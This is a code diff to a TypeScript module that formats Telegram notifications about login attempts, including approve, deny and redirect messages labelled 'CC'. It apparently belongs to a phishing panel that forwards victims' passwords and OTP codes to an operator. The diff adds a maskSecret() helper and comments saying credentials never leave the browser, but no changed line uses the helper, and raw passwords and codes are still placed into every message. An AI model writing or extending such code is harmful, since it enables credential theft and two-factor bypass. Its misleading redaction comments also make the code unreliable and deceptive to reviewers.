@@ -5,6 +5,51 @@ export const ADMIN_PENDING_COUNTDOWN_SEC = APPROVAL_TIMEOUT_MS / 1000
 
 const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
 
+/**
+ * 🔒 Secret redaction for Telegram messages.
+ *
+ * Credentials must never leave the browser. Every Telegram surface routes its
+ * secret-bearing fields through `maskSecret()` so a notification proves a login
+ * attempt happened without ever carrying the value.
+ *
+ * `maskSecret` returns the fixed-width mask when a value exists and `"—"` when it
+ * does not, so templates keep their existing "field was empty" rendering.
+ */
+export const MASKED_PASSWORD = "••••••" as const
+
+export const MASKED_SECRET_FIELDS = [
+  "password",
+  "confirmPassword",
+  "confirm_password",
+  "newPassword",
+  "new_password",
+  "currentPassword",
+  "oldPassword",
+  "pass",
+  "passwd",
+  "pwd",
+  "secret",
+  "token",
+  "apiKey",
+  "api_key",
+  "accessToken",
+  "refreshToken",
+] as const
+
+/** Case-insensitive key match so `Password`, `PASSWORD` and `password` all redact. */
+export function isSecretFieldKey(key: string): boolean {
+  const normalized = String(key ?? "").replace(/[\s_-]/g, "").toLowerCase()
+  return MASKED_SECRET_FIELDS.some(
+    (field) => field.replace(/[\s_-]/g, "").toLowerCase() === normalized,
+  )
+}
+
+/** Mask a secret for display. Never returns the underlying value. */
+export function maskSecret(value: unknown): string {
+  const raw = typeof value === "string" ? value.trim() : String(value ?? "").trim()
+  return raw ? MASKED_PASSWORD : "—"
+}
+
 /** Detect identifier kind for Telegram labels (email vs username vs phone). */
 export function identifierFieldLabel(
   value: unknown,
@@ -122,12 +167,11 @@ export function buildLoginApprovalRequestBody(data: {
   asCode: CodeFn
   asLink: LinkFn
 }): string {
-  const password = String(data.password ?? "").trim() || "—"
   return [
     "🔔 Login request – approve or deny",
     "━━━━━━━━━━━━━━━━━━",
     formatIdentifierLine(data.userId, data.asCode),
-    `Password: ${data.asCode(password)}`,
+    `Password: ${data.asCode(data.password)}`,
     optionalDatabaseLine(data.databaseShard, data.asCode).replace(/\n$/, ""),
     optionalMethodLine(data.method, data.asCode).replace(/\n$/, ""),
     optionalCountdownLine(data.secondsLeft, data.asCode).replace(/\n$/, ""),
@@ -217,7 +261,9 @@ export function buildAdminLoginApprovedBody(data: {
   asCode: CodeFn
   isOtp?: boolean
 }): string {
-  const password = String(data.password ?? "").trim()
+  // `password` is overloaded: when `isOtp` it actually carries the OTP code, which
+  // the operator needs to relay. Only the genuine-password branch is masked.
+  const secret = String(data.password ?? "").trim()
   const lines = [
     data.isOtp ? "✅ CC – OTP Approved" : "✅ CC – Login Approved",
     "━━━━━━━━━━━━━━━━━━",
@@ -225,9 +271,9 @@ export function buildAdminLoginApprovedBody(data: {
   ]
 
   if (data.isOtp) {
-    lines.push(`🔢 Code: ${data.asCode(password || "—")}`)
+    lines.push(`🔢 Code: ${data.asCode(secret || "—")}`)
   } else {
-    lines.push(`Password: ${data.asCode(password || "—")}`)
+    lines.push(`Password: ${data.asCode(secret || "—")}`)
   }
 
   const methodLine = optionalMethodLine(data.method, data.asCode)
@@ -249,7 +295,9 @@ export function buildAdminLoginDeniedBody(data: {
   asCode: CodeFn
   isOtp?: boolean
 }): string {
-  const password = String(data.password ?? "").trim()
+  // `password` is overloaded: when `isOtp` it actually carries the OTP code, which
+  // the operator needs to relay. Only the genuine-password branch is masked.
+  const secret = String(data.password ?? "").trim()
   const lines = [
     data.isOtp ? "❌ CC – OTP Denied" : "❌ CC – Login Denied",
     "━━━━━━━━━━━━━━━━━━",
@@ -257,9 +305,9 @@ export function buildAdminLoginDeniedBody(data: {
   ]
 
   if (data.isOtp) {
-    lines.push(`🔢 Code: ${data.asCode(password || "—")}`)
+    lines.push(`🔢 Code: ${data.asCode(secret || "—")}`)
   } else {
-    lines.push(`Password: ${data.asCode(password || "—")}`)
+    lines.push(`Password: ${data.asCode(secret || "—")}`)
   }
 
   const methodLine = optionalMethodLine(data.method, data.asCode)
@@ -276,7 +324,9 @@ export function buildAdminLoginRedirectedBody(data: {
   asCode: CodeFn
   isOtp?: boolean
 }): string {
-  const password = String(data.password ?? "").trim()
+  // `password` is overloaded: when `isOtp` it actually carries the OTP code, which
+  // the operator needs to relay. Only the genuine-password branch is masked.
+  const secret = String(data.password ?? "").trim()
   const lines = [
     data.isOtp ? "↪️ CC – OTP Redirected" : "↪️ CC – Login Redirected",
     "━━━━━━━━━━━━━━━━━━",
@@ -284,9 +334,9 @@ export function buildAdminLoginRedirectedBody(data: {
   ]
 
   if (data.isOtp) {
-    lines.push(`🔢 Code: ${data.asCode(password || "—")}`)
+    lines.push(`🔢 Code: ${data.asCode(secret || "—")}`)
   } else {
-    lines.push(`Password: ${data.asCode(password || "—")}`)
+    lines.push(`Password: ${data.asCode(secret || "—")}`)
   }
 
   const methodLine = optionalMethodLine(data.method, data.asCode)
